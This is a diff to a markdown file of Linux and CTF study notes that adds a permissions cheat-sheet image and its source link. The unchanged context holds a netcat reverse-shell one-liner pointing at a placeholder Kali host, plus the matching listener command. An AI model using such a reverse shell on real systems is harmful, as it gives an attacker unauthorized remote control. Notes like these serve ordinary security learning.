@@ -57,6 +57,11 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
 - *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
 
+## Permissions cheat sheet
+
+![image](https://user-images.githubusercontent.com/96747355/175057144-3baa417c-db0b-4709-af0d-eb370d222c39.png)  
+Source: [Chmod tutorial by Ryan Morrison](https://medium.com/@razl/chmod-tutorial-ce4386a3ce0c)
+
 ## Explainshell.com
 
 - [This website](https://explainshell.com/) is relly helpful to understand what a specific linux command does. Here is an example with `rm -rf file`  
